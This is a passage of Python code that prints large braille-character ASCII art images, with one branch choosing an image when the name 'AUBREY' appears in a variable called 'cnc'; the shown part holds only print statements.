                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢹⣿⣿⣿⣿⣿⣿⣿⣿⢃⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠘⠻⣿⣿⣿⣿⣿⡿⢁⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢹⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⣡⣾⣿⣷⢸⣿⣿⣿⡿⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢡⣾⣿⣿⠅⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣾⣿⠏⣩⣍⢻⣏⠘⢿⣿⣿⢃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣰⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣂⠻⢿⡄⠿⠗⢠⣿⣿⡄⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⢃⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣾⣿⣿⣿⠛⠿⢛⣠⣿⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⠇⣞⡻⢿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣤⣍⣛⣛⣡⣾⣿⣿⣿⣿⣧⡘⢿⣿⣿⣿⣿⣿⠿⢛⣡⣴⣿⣿⣿⣿⣿⣿⠏⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣭⣭⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⠋⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡍⢡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠻⣿⣛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⢻⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢁⣥⣶⣿⣿⣷⣽⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣸⣿⣿⣿⣿⣿⠿⠟⣋⣩⣭⣭⣭⣭⣭⣉⣛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣿⣿⡿⢟⣡⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣝⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡃⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢹⣿⡟⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⣿⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⣷⠸⣿⡿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠑⢸⡏⠈⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢻⣿⣿⣿⣿⣿⣿⣿⣿⡇⢲⣿⣴⣿⣿⡬⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠸⣿⣿⣷⣦⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⢻⣿⣿⣿⣿⣿⣿⡟⣰⣿⣿⣿⣿⣿⣼⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣤⡙⢿⣿⣿⣿⣿⣿⣿⡏⢭⡙⢿⣿⣿⣿⣿⣿⡟⠻⠿⢿⣿⣿⣿⣿⡈⣿⣿⣿⣿⣿⡟⠡⣿⡇⢯⢉⡉⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣤⣶⣶⡶⠾⣳⣦⣍⣛⣛⠿⣿⡆⠶⣶⡞⣿⣿⣿⣿⣿⣦⣤⣤⣀⠈⠙⣿⣿⠃⣹⣿⣿⡿⢋⣤⣷⣬⣉⣤⣏⠰⠿⠿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣰⣿⣿⡟⣡⣶⣿⣿⣿⣿⣿⣿⣷⡮⠻⠷⠶⠶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⠟⣸⡿⠟⣩⡐⣿⢿⡿⣶⡍⢻⣿⣿⣶⣧⣙⠛⢻⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⣿⡿⣠⣿⣿⣿⣿⣿⣿⣿⣿⣵⣾⣿⣿⣿⣿⣶⣭⣛⣿⣿⣿⣿⣿⣿⠿⠟⢉⣀⣡⣦⣠⣄⡀⠿⡆⠗⣠⣴⣿⡟⣋⣝⣫⣽⣾⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⢰⣿⣿⣇⢿⣿⣿⣿⣿⣿⢋⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⠀⣀⣀⣴⡆⢿⣿⣿⣿⣿⣿⣿⡏⣤⣴⣶⣿⣿⣿⢃⣽⡿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣌⠻⣿⡿⠿⢿⣿⣿⣿⣏⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡙⠻⠟⣡⣾⣿⣿⣿⣿⠈⢿⣿⣿⣿⡿⠿⠿⠞⣛⡛⣿⣿⣿⣶⣶⣶⣈⣛⣻⣟⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⡚⣧⣭⣿⣿⡘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣌⣙⠻⠿⣿⣿⠿⠗⣨⡙⣿⣿⡇⠘⢗⣿⣿⣿⣮⡛⣿⠻⡿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹⣿⣿⣿⣿⣾⣍⣛⣛⡛⢉⠸⣿⣿⣿⣿⣿⣿⡿⢃⣴⣶⡆⢿⣿⣧⢹⣿⣅⠀⠀⢼⡿⣯⢽⣿⡌⣾⣿⣿⣮⣿⡍⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠰⠦⠱⣝⠿⢿⣿⠿⢋⣴⣾⣷⣦⣭⣛⣛⣛⣫⣴⣿⣿⣿⡇⣼⣿⠏⣸⢋⣭⣭⣂⣴⣿⡶⢴⡎⣷⢻⡿⢻⡟⠘⠃⠙⢻ ')
                print('⣿⣿⣿⣿⣿⣏⠿⣿⢛⣻⣟⡛⣩⣶⣦⠹⣷⢲⣦⣁⠙⣄⡴⢂⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢃⣬⣥⣄⠻⣧⡽⣿⣰⢿⣿⣷⡆⠆⣹⡌⠃⠻⠁⣀⣤⣤⣤ ')
                print('⣿⣿⣿⣿⣿⣿⣿⠟⣼⣿⢿⣿⣿⣿⡿⣶⡎⣷⣿⣿⣿⠏⣴⣿⣿⣿⣿⢋⣼⣿⣿⣿⣿⣿⣿⣿⡿⢃⣾⣿⣿⣿⣷⠈⣇⡉⠹⡇⣿⣿⠀⣼⣿⡿⠃⣐⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣧⣭⡛⢦⣉⣡⡄⢿⣿⣿⠇⣠⣤⣿⣿⣿⣿⢸⣿⣿⣿⡏⢡⣿⣿⣶⣾⣿⣶⣦⣽⢛⠐⢉⣴⣭⣭⣭⣥⣤⠉⢿⣶⣴⣬⣤⣦⡿⢃⣶⣿⣿⣿⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣍⣉⣡⣾⣿⣿⣿⣦⡭⢁⣔⣿⣿⣿⣙⣋⣵⣤⣽⣯⣿⣷⣦⢻⡿⣿⣿⣿⣿⣿⣷⣏⡘⢿⣿⣿⣿⣿⣿⣿⣿⣦⣌⡛⢿⣿⣿⣿⣯⡛⠿⣿⣿⣿⣿⣿⣿ ')
                print('⣯⣙⣻⣏⣽⣿⣿⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⡟⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣆⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⢹⣿⣿⣿⣿⣷⣮⡻⣿⣿⣿⣿ ')
                print('⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ')
                                        
        elif "AUBREY" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠉⠀⠀⢀⠎⠀⠀⠀⠀⠀⠀⠀⢹⡟⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣥⣶⠘⣿⡿⣿⣦⣾⣛⣯⣟⡿⣽⢯⣟⠛⠀⢈⣩⣝⣯⣻⣽⣫⢿⡽⣶⢶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠁⡔⡆⠀⠀⢸⡀⠀⠀⢠⣖⠛⢲⣄⡼⠃⠀⠀⠉⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⠋⣭⡙⣿⣟⣾⣽⣯⣿⢾⣿⣀⣸⣷⣻⣞⣷⣯⣟⣯⢿⣽⣻⢾⣽⣶⡄⠀⠀⠀⠀⠀⢀⣴⡿⠛⢷⡄')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⠋⢀⡠⠇⠙⣒⠆⠈⢧⡀⠀⠀⠉⠉⣹⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠻⠿⢿⣿⣿⣿⣿⣿⣮⣛⣡⣿⣿⣿⣯⣷⣿⣿⣯⣿⣟⣷⣿⢾⣻⣽⣯⣟⣿⡾⣟⣿⣯⠿⠷⣮⣀⠀⢀⣴⠟⠁⠀⠀⠀⢻⡄')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⠀⠛⠶⠺⣨⠇⠀⠀⠀⢙⠒⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠛⠻⠻⠿⠿⠿⠿⠷⠿⠿⠿⠿⠞⠛⢻⣿⠋⠀⠈⠉⠛⠢⣤⣀⠀⠙⣿⣮⣿⠁⠀⠀⠀⠀⠀⠀⢷')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠁⠀⠀⠀⢀⣀⣉⣀⣠⠖⠊⠉⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠐⠈⡀⠁⠌⡀⠂⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠔⢒⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⡆⠀⠠⢀⠀⠀⠀⠉⠻⣶⣮⣿⡃⠀⠀⠀⠀⠀⠀⠀⠘⡇')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⢿⠀⠀⠈⠁⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⢀⠂⠄⡁⠒⠠⠑⡐⠠⢁⠂⠐⠀⠀⠀⠀⠀⠀⠀⠐⡠⠎⡡⠂⣡⠴⠒⠒⢶⡄⠀⠀⠀⠀⣿⡇⠀⠀⣠⣤⣄⣀⠀⠀⠈⢿⠁⢻⡄⠀⠀⠀⠀⠀⠀⠀⣷')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⡨⠓⠀⠀⠀⠀⠀⠈⢳⡄⠀⠀⠀⠀⠀⠀⠀⠂⠀⠂⠀⠁⠂⠁⠀⠂⠀⠀⢈⡐⣀⣀⣀⣀⣀⡠⢊⣤⣊⡴⢛⣥⣶⣿⣦⢸⣇⣀⣀⣀⡀⣿⣷⠀⠀⠑⠁⠀⠉⠙⠛⢦⣾⡇⢸⡇⠀⠀⠀⠀⠀⠀⠀⣿')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠏⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⢀⣀⣴⣾⡿⣀⣀⣀⣠⣤⣤⣤⣴⣶⣶⣶⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣿⡿⢋⣴⣿⣿⣿⣿⠏⣼⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣼⠇⠀⠀⠀⠀⠀⠀⠀⣿')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣄⠀⠀⠀⠀⣀⣿⣠⣤⣧⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⢹⣿⡎⣿⣿⣿⢿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣧⡘⢿⣿⣿⣿⠏⣼⣿⣿⣿⣿⢿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣷⣤⣀⠀⠀⠀⠀⢠⡿⣧')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⢻⣿⣿⣿⣿⣷⣭⣾⣿⣟⡟⣞⣿⣿⣿⣿⡿⠀⠙⢿⣿⣿⣿⣦⣌⠛⠋⣼⣿⣿⣿⡏⣶⣷⡌⣿⣿⣿⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣴⣿⣷⣿⣿⣆')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣯⣠⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠘⣿⣿⣿⣿⣿⣿⡟⢻⣿⣽⣿⣿⣿⣿⣿⠇⠀⠀⣰⣿⢿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣷⣙⣛⣵⣿⣿⣿⣧⣄⣠⣴⣿⣿⡟⢋⠉⠙⠛⠿⣿⣿⣿⣿⣿⡿⠟⢁⡘⣿⣧⠂')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿⣇⣻⠿⢛⣿⣿⣿⣿⡁⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⣠⣾⡿⠃⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢯⣟⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⡟⣿⣉⡴⠞⠋⠁⢸⣿⣧')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣵⠰⣿⣿⣿⣿⡿⠙⢿⣷⣤⣀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣃⣼⣿⡟⠁⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣻⢾⡽⣿⣿⣿⢿⣻⣧⠀⠀⠀⡎⢢⠐⠁⣧⣿⢻⣞⠿⠿⠿⠿⣿⡧')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡿⠁⠀⠀⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢀⣤⣐⣀⣀⣀⣴⠈⠙⠛⠿⣿⣿⣿⣿⣾⣽⣯⣿⣿⣿⡽⣯⢷⣻⡆⠀⠀⠀⠉⠀⠀⣿⣿⣧⣽⡻⢷⣦⣄⣿⡇')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡟⠉⠻⣿⡿⠋⠀⠀⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⣰⣀⣀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⢀⣤⣿⣿⣿⠧⠤⠚⠻⠿⣿⣶⣦⣀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⣿⣿⣷⡀⠀⠀⠀⣠⡾⠿⣿⣿⣿⣿⣷⣬⡿⠋')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢸⣿⣿⣿⣿⣷⡀⠀⠈⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⣀⣽⣿⣶⣄⡀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠯⠁⠀⢫⣾⡿⠋⣡⣴⠒⠂⢲⣦⣄⡙⠻⣿⠟⠉⢿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣾⡟⠀⠀⠈⢻⠿⠋⠉⠙⣷')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠑⢄⣾⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡿⠋⠉⢀⣠⣴⡿⠯⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢠⢤⣄⠀⠉⠃⠀⣼⠿⠏⣿⠻⣿⣿⣿⣿⡄⢸⡀⠀⢸⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠅⠀⠀⢠⣤⣀⠀⠀⠀⡜')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣺⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⢰⡿⡛⠏⣱⢶⣾⣿⣆⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⠳⢿⠼⠀⠀⠀⠰⣯⣙⣶⣟⠀⢙⣋⣿⣿⡇⠘⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣴⣿⣿⣷⣆⢀⢰⠃')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠃⠀⠀⣿⣦⣬⡷⡏⠈⣛⣛⣿⣿⣿⣿⣿⣿⣿⣿⡿⣧⡳⡖⠒⣤⠖⠳⠄⠀⠀⠻⡋⠀⠈⢇⣻⣿⣿⡿⠁⠀⠀⠀⠀⠙⢿⣿⡿⢛⣭⡶⠶⣦⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡏')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡿⠿⢿⣿⣿⣿⣿⣿⠀⢀⠀⠀⢿⣿⠉⠉⠻⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠙⢄⡀⢀⠞⠀⠀⠀⠀⠈⠲⠦⣟⣉⠹⠋⢀⡠⡆⠀⠀⠀⠀⠈⠁⢀⡾⣿⣿⣆⠈⢢⠘⣿⣿⡿⢿⣿⣿⠿⠛⢿⣿⣿⣿⣿⣷⡀')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠻⣸⣿⣿⣿⣿⣿⡄⠘⣆⠀⠈⠓⢤⣠⠴⠛⢻⠟⣹⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⢀⣀⡈⠉⠀⠀⠀⠀⠀⡖⠐⠒⠶⠲⠖⢶⠚⠉⢳⣄⣴⠀⠀⠀⢀⣾⣧⣀⠈⠉⠀⠐⠇⣿⣿⠀⠀⠨⠟⠀⠀⢸⣿⣿⣿⣿⣿⣷')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠚⠓⢤⠤⠤⠤⠖⠒⠂⢀⣿⣿⣿⣿⡿⠓⡶⠹⣯⣹⡏⠁⣿⠛⡿⣦⡀⢀⡤⠚⢣⠀⡀⠀⡆⠀⡈⢠⠶⣢⣍⢚⡤⠦⡄⠸⢿⣿⣿⡇⡀⢪⠑⡀⢿⣿⣷⣄⠀⠀⠂⠀⣼⣿⣿⣿⣿⣿⣿⣗⡀')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⢈⠂⡀⠀⣆⠀⠀⣸⣿⣿⣿⣿⠁⢰⣧⠤⠼⠧⠶⠶⠋⠈⠤⠬⠳⣄⢣⠀⣨⠃⠇⠀⡇⠀⠣⢸⡄⠀⠙⠋⠀⣘⠇⠠⣲⠀⣹⡇⢡⠀⠉⢠⣿⣿⣿⣿⣷⣦⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣆')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⠿⢫⣿⣿⣿⡿⠅⠘⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠃⠀⠓⠀⠘⠄⢠⣿⣿⣿⣟⠤⠌⣤⠞⠛⠛⠛⠛⠛⠋⠛⠶⣭⣯⠟⠀⠷⠑⡶⠒⠂⠀⢀⣠⣏⠳⡀⠀⢀⡼⠋⠀⢠⢳⠿⠏⠀⠁⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄')
                print('⠀⠀⠀⠀⠀⠀⣠⢴⣻⣿⣿⠟⠁⢰⣿⣿⣿⣷⣴⠀⢰⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣀⣀⣀⡀⢀⡤⠒⠐⢾⣿⡿⠋⠛⠒⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠂⣤⣤⣙⣥⣤⡙⠗⠋⠀⠀⣠⣼⣜⣦⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯')
                print('⠀⠀⠀⠀⠀⢸⣿⣿⡿⠋⠁⠀⢠⣾⣿⣿⣿⣿⣿⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⡏⠀⠀⠘⢝⡞⠀⠀⠀⢸⣿⠀⠀⢰⣦⣴⠀⠰⠤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠛⢛⡼⠛⣃⠉⢑⡻⢽⣆⣿⣿⣿⣻⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡅')
                print('⠀⠀⠀⣠⣴⣿⠟⠉⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⣽⣿⣠⢤⡘⠿⠏⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣾⣿⣿⣿⣿⠀⠀⠀⠀⢾⣠⣜⣋⢁⡹⡆⢀⣿⣿⣿⣿⣿⣿⣿⣞⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣇')
